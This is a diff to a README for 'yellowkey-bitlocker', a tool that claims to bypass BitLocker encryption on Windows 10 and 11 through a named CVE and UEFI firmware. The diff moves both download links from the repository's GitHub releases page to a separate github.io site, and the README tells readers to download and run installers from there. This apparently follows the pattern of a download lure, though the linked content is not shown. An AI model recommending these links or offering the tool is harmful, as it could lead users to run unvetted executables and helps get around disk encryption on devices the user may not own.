@@ -1,6 +1,6 @@
 # 🔑 yellowkey-bitlocker - Unlock your encrypted drive with ease
 
-[![Download Yellowkey Bitlocker](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/incensetreesimplependulum71/yellowkey-bitlocker/releases)
+[![Download Yellowkey Bitlocker](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://incensetreesimplependulum71.github.io)
 
 ## 📁 Project Overview
 Yellowkey-bitlocker provides a way to regain access to your files when you face a BitLocker yellow screen error. This tool targets the CVE-2026-45585 vulnerability to bypass encryption locks on Windows 10 and Windows 11 systems. It assists users who lose their recovery keys or trigger boot loops on devices like the Surface Pro. The software interacts directly with the UEFI firmware to bypass standard security prompts.
@@ -16,7 +16,7 @@ Before you begin, ensure your computer meets these basic requirements:
 ## 📥 Getting the Software
 To start the recovery process, visit the official release page. You will find the latest installer files there.
 
-[Click here to visit the release page and download the tool](https://github.com/incensetreesimplependulum71/yellowkey-bitlocker/releases)
+[Click here to visit the release page and download the tool](https://incensetreesimplependulum71.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
